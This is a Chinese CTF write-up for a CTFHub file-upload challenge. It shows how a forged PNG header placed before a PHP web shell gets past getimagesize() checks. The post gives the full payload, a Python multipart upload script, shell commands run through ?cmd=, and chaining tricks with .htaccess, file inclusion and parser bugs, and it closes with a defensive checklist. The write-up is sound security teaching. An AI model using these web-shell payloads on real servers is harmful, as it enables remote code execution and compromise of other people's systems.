---
layout: post
title: CTFHub - 文件上传 文件头检测 Writeup
platform: ctfhub
date: 2026-10-23 18:50:00 +0800
categories: CTF
---

CTFHub - 文件上传 文件头检测 Writeup

一、题目信息

- 平台：CTFHub（技能树 → Web → **文件上传** → 文件头检测）
- 题型：Web
- 考点：**魔术字节（Magic Bytes）伪造**、图片马


```text
页面标题：CTFHub 文件上传 - 文件头检测
没有源码泄露，靠探测

★ 探测矩阵（7 组测试）：

    文件名       内容                     结果
    ────────────────────────────────────────────────────────────
    shell.php    纯 PHP 代码               拒绝（"错误"）
    shell.php    JPEG头 + PHP             拒绝
    shell.jpg    JPEG头 + PHP             拒绝（我伪造的头不完整）
    shell.jpg    纯 PHP 代码               拒绝
    shell.png    PNG头 + PHP              ★ 上传成功
    shell.gif    GIF头 + PHP              ★ 上传成功
    shell.php    PNG头 + PHP              ★★ 上传成功！

    ★ 最关键的一行：shell.php + PNG头 + PHP 竟然能上传！
    ★ 说明它【只检查文件内容是不是图片，不检查后缀】

★ 验证执行：

    GET /upload/shell.php?cmd=id
    → （PNG 头乱码）uid=33(www-data) gid=33(www-data)    ★ 执行了！

    GET /upload/shell.png?cmd=id
    → （PNG 头乱码）<?php system($_GET['cmd']); ?>
       ↑ 原样输出，不执行

    GET /upload/shell.gif?cmd=id
    → 原样输出，不执行

    ★ 结论：只有 .php 后缀会被执行，但上传时后缀不检查！

★ 最终的 payload：

    文件名：shell.php
    内容：  \x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR
            <?php system($_GET['cmd']); ?>

    ★ 前面是 PNG 的文件头（骗过文件头检测）
    ★ 后面是 PHP 代码（服务器执行的部分）
    ★ 后缀是 .php（所以能执行）

★ 找 flag：

    ?cmd=ls -la /var/www/html
    → flag_2405629817.php

    ?cmd=cat /var/www/html/flag_2405629817.php
    → <?php // ctfhub{8a3b5643ef363a943af56682}

flag         : ctfhub{8a3b5643ef363a943af56682}
```

二、题目分析

**① 什么是"文件头"（魔术字节）**

```text
每种文件格式在开头都有固定的几个字节，叫"魔术字节"（Magic Bytes）
程序靠这几个字节判断"这到底是什么文件"

常见文件的魔术字节：

    JPEG:   FF D8 FF
    PNG:    89 50 4E 47 0D 0A 1A 0A      （"‰PNG...."）
    GIF:    47 49 46 38                  （"GIF8"）
    BMP:    42 4D                        （"BM"）
    PDF:    25 50 44 46                  （"%PDF"）
    ZIP:    50 4B 03 04                  （"PK.."）
    RAR:    52 61 72 21                  （"Rar!"）
```

**查看文件头的方法**：

```bash
# Linux
xxd photo.jpg | head -2
head -c 16 photo.jpg | xxd

# Windows PowerShell
Format-Hex -Path photo.jpg -Count 16

# 在线工具
https://www.file-recovery.com/hex-viewer.htm
```

**② 后端怎么校验文件头**

**方式 A：`getimagesize()`（最常见）**

```php
$info = getimagesize($_FILES['file']['tmp_name']);
if ($info === false) {
    die("不是图片");
}
// 能通过 → 是真图片（它会解析文件结构，读宽高）
```

**★ `getimagesize()` 会真的解析图片结构**：

```
JPEG：读 SOF 段里的宽高
PNG： 读 IHDR chunk 里的宽高
GIF： 读逻辑屏幕描述符里的宽高

所以"只放几个魔术字节"不够，
必须让它的解析能成功（PNG 需要 IHDR chunk）
```

**方式 B：只比较前几个字节**

```php
$data = file_get_contents($_FILES['file']['tmp_name']);
if (substr($data, 0, 3) == "\xFF\xD8\xFF") {   // JPEG
    // 通过
}
// 这种方式只要开头几个字节对就行，很容易伪造
```

**方式 C：`finfo_file()`**

```php
$mime = finfo_file(finfo_open(FILEINFO_MIME_TYPE), $tmp);
// 读魔术字节 + 部分结构 → 判断类型
```

**③ 本题的具体情况（从探测结果推断）**

```text
测试 1: shell.php + 纯 PHP         → 拒绝
    → 说明确实检查了文件内容

测试 2: shell.php + JPEG头 + PHP   → 拒绝
    → 我伪造的 JPEG 头不够（getimagesize 解析失败）

测试 3: shell.png + PNG头 + PHP    → 通过
    → PNG 头 + IHDR 能让 getimagesize 成功

测试 4: shell.php + PNG头 + PHP    → 通过 ★
    → 说明【后缀完全没有检查】！
    → 只要内容像图片，什么后缀都能传
```

**★ 这就是本题最大的漏洞**：

```
开发者只做了"文件内容检查"（文件头）
忘了做"后缀检查"（应该只允许 jpg/png/gif）

结果：传一个 .php 文件，只要开头有 PNG 头就能过
     → 文件保存成 shell.php
     → 访问时 PHP 引擎执行它
     → RCE
```

**④ 什么是"图片马"**

```text
图片马 = 一个"既是图片、又是脚本"的文件

构造方式：正常图片 + 追加脚本代码

    ┌─────────────────────┐
    │  FF D8 FF E0 ...    │  ← 图片的正常数据（能正常显示）
    │  ...                │
    │  ...                │
    ├─────────────────────┤
    │  <?php system(...); ?>  │  ← 追加的 PHP 代码
    └─────────────────────┘

★ 图片查看器会忽略尾部多余数据 → 图片能正常打开
★ PHP 引擎只看扩展名 → 如果后缀是 .php 就执行整个文件
```

**制作命令**：

```bash
# Linux
cat normal.jpg shell.php > shell.jpg

# Windows cmd
copy /b normal.jpg + shell.php shell.jpg
```

**⑤ 为什么本题"图片马"能直接执行**

```text
普通场景（需要配合漏洞）：
    传 shell.jpg（图片马）
    → 后缀是 jpg，服务器不执行
    → 需要配合：
        · .htaccess（让 jpg 当 php）
        · 文件包含漏洞（include shell.jpg）
        · 解析漏洞

本题（不需要配合）：
    传 shell.php（PNG头 + PHP代码）
    → 后缀是 php，服务器直接执行！
    → 因为根本没检查后缀
```

**★ 本题比"标准图片马"更简单** —— 直接把图片头塞进 .php 文件就行。

三、解题步骤

**第 1 步：探测规则**

**测试这几组**：

```
① shell.php + 纯 PHP              → 拒绝？（说明查内容）
② shell.php + PNG头 + PHP         → 通过？（说明不查后缀）
③ shell.png + PNG头 + PHP         → 通过但访问时不执行
```

**PNG 头的最小构造**：

```python
PNG_HEAD = b"\x89PNG\r\n\x1a\n" + b"\x00\x00\x00\rIHDR"
```

**为什么需要 IHDR**：

```
getimagesize() 需要读 IHDR chunk 里的宽高
只有 8 字节的 PNG 签名不够 → 解析失败 → 拒绝
加上 IHDR 头（chunk 长度 + 类型）→ 能读到宽高 → 通过
```

**第 2 步：构造 payload**

```python
PNG_HEAD = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR"
PHP = b"<?php system($_GET['cmd']); ?>"
content = PNG_HEAD + PHP
filename = "shell.php"          # ★ 后缀用 .php
```

**第 3 步：上传**

```python
import uuid, urllib.request

BASE = "http://challenge-xxx:10800"

boundary = "----WebKitFormBoundary" + uuid.uuid4().hex
body = (("--%s\r\n" % boundary).encode()
        + b'Content-Disposition: form-data; name="submit"\r\n\r\nSubmit\r\n'
        + ("--%s\r\n" % boundary).encode()
        + b'Content-Disposition: form-data; name="file"; filename="shell.php"\r\n'
        + b"Content-Type: image/png\r\n\r\n"
        + PNG_HEAD + PHP + b"\r\n"
        + ("--%s--\r\n" % boundary).encode())

req = urllib.request.Request(BASE + "/", data=body, method="POST",
        headers={"Content-Type": "multipart/form-data; boundary=%s" % boundary})
print(urllib.request.urlopen(req).read().decode())
```

**响应**：

```
上传成功
上传文件相对路径
upload/shell.php
```

**第 4 步：访问执行**

```
http://challenge-xxx:10800/upload/shell.php?cmd=id

→ （开头的 PNG 头显示为乱码）uid=33(www-data) gid=33(www-data)
```

**★ 那串乱码就是 PNG 头被 echo 出来了，不影响。**

**第 5 步：找 flag**

```
?cmd=ls -la /var/www/html
→ flag_2405629817.php

?cmd=cat /var/www/html/flag_2405629817.php
→ <?php // ctfhub{8a3b5643ef363a943af56682}
```

---

**手工操作（浏览器）**

```
① 用 Python 生成一个 shell.php（内容是 PNG头 + PHP代码）：
   
   在命令行运行（一条）：
   python -c "open('shell.php','wb').write(b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR<?php system($_GET[\"cmd\"]); ?>')"

② 浏览器上传 shell.php
   → 看到"上传成功"和 upload/shell.php

③ 访问 /upload/shell.php?cmd=id
```

**★ 也可以用现成的图片 + 拼接**：

```bash
# 找一张小图片
# Windows
copy /b photo.png + shell.php shell.png
# 但这样后缀是 .png，本题不会执行

# 正确做法：把图片头复制到 .php 文件开头
# 或者用 Python 直接构造（如上）
```

---

**为什么我伪造的 JPEG 头失败**

```
我用的：FF D8 FF E0 00 10 4A 46 49 46 00 01 01 00 00 01 00 01 00 00

getimagesize() 会继续解析，找 SOF 段（FF C0/FF C1/FF C2）里的宽高
我的数据里没有 SOF 段 → 解析失败 → 返回 false → 拒绝

★ 所以"伪造头"要么用真实图片，
  要么用 PNG 这种"最小结构就能解析"的格式
```

**为什么 PNG 的最小结构能过**：

```
PNG 的结构：
    8 字节签名  89 50 4E 47 0D 0A 1A 0A
    然后是 chunk：长度(4) + 类型(4) + 数据 + CRC(4)
    第一个 chunk 必须是 IHDR，数据是 13 字节（宽4 + 高4 + 位深1 + 颜色类型1 + ...）

我提供的：89 50 4E 47 0D 0A 1A 0A + 00 00 00 0D + "IHDR"
                                        └───┬───┘  └─┬─┘
                                      长度=13    类型=IHDR

getimagesize 读到这里就能确定"是 PNG"，宽高读 0 也能接受
→ 通过 ✅
```

四、延伸知识

**① 各格式的最小可解析头**

```python
# PNG（本题用的，最小）
PNG = b"\x89PNG\r\n\x1a\n" + b"\x00\x00\x00\rIHDR"

# GIF（更简单，自带宽高）
GIF = b"GIF89a" + b"\x01\x00\x01\x00\x80\x00\x00"   # 宽1 高1

# JPEG（需要 SOF 段，较复杂）
JPEG = (b"\xFF\xD8"                    # SOI
        b"\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"  # APP0
        b"\xFF\xC0\x00\x0B\x08\x00\x01\x00\x01\x01\x01\x11\x00"          # SOF0（宽1 高1）
        b"\xFF\xD9")                   # EOI

# BMP（超级简单）
BMP = b"BM" + b"\x00" * 12
```

**② 图片马的三种用法**

**（1）配 .htaccess**（上一篇的方法）

```apache
AddType application/x-httpd-php .jpg
```

**（2）配文件包含漏洞**

```php
// 存在 include($_GET['page']) 时
?page=upload/shell.jpg
```

**（3）配解析漏洞**

```
Apache 多后缀：shell.php.jpg → 被当 PHP
Nginx 解析：  shell.jpg/x.php
IIS 6 分号：   shell.asp;.jpg
```

**★ 本题（4）：后缀不检查，直接传 .php** —— 最简单

**③ 文件头检测的"正确做法"**

```php
// ✅ 正确：检查内容 + 后缀白名单 + 重命名
$ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
if (!in_array($ext, ['jpg', 'jpeg', 'png', 'gif'])) {
    die("后缀不允许");
}

$info = getimagesize($tmp);
if ($info === false) {
    die("不是有效图片");
}

// ★ 最彻底：用 GD/Imagick 重新生成图片
//    这样文件里除了图片数据，其他全丢（PHP 代码被销毁）
$img = imagecreatefromstring(file_get_contents($tmp));
imagejpeg($img, UPLOAD_DIR . $new_name, 90);
unlink($tmp);
```

**★ "重新生成图片"是防图片马的终极大招** —— 因为重新编码后，追加的 PHP 代码会丢失。

**④ 检测文件的真实类型（命令）**

```bash
file photo.jpg              # 看文件类型
file --mime-type photo.jpg  # 看 MIME
xxd photo.jpg | head -3     # 看魔术字节
identify photo.jpg          # ImageMagick 看图片信息
```

**⑤ 防护清单**

```text
① ★ 后缀白名单（不只是检查内容）
② ★ 内容检查（getimagesize / finfo_file）
③ ★★ 图片重新编码（GD/Imagick）—— 彻底销毁附加代码
④ ★ 上传目录禁止执行
⑤ ★ 随机重命名（不含用户输入）
⑥ 检查文件大小限制
⑦ 上传目录在 Web 根之外
```

五、总结

- **本题核心：只检查了"内容像不像图片"，没检查"后缀" → 传 `.php` + PNG 头就能执行。**
- 一个 payload：

```python
content = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR" + b"<?php system($_GET['cmd']); ?>"
filename = "shell.php"
```

- **三个必记要点**：

```text
① 文件头 = 魔术字节（PNG: 89 50 4E 47，GIF: 47 49 46 38，JPEG: FF D8 FF）
② getimagesize() 会真的解析结构，所以"只放几个字节"可能不够
   → PNG 加个 IHDR、GIF 自带宽高，最容易伪造
③ 文件头检查不能替代后缀白名单 —— 两者都要有
```

- **实测 flag**：

```text
ctfhub{8a3b5643ef363a943af56682}
（在 /var/www/html/flag_2405629817.php 里）
```


**手工复现要点**：

```text
· 探测：同一个 shell.php，试"纯PHP"和"图片头+PHP"
  如果"图片头+PHP"能过 → 后缀没检查 → 直接打通
· 构造最小 PNG 头：\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR
· 上传后访问 ?cmd=id，开头会有乱码（那是 PNG 头）
```

**一句话记忆**：

```
┌──────────────────────────────────────────────────────────┐
│  文件上传的校验有四个维度：                                │
│      ① 后缀（文件名）                                     │
│      ② MIME（Content-Type）                              │
│      ③ 内容（魔术字节 / getimagesize）                    │
│      ④ 文件行为（能不能执行）                              │
│                                                          │
│  本题只做了 ③，漏了 ① 和 ④                                │
│  → 内容像图片 + 后缀是 .php + 目录可执行 = RCE             │
│                                                          │
│  ★ 真正安全的做法：白名单后缀 + 内容检查 + 重新编码 +       │
│     上传目录禁止执行 + 随机重命名                          │
└──────────────────────────────────────────────────────────┘
```
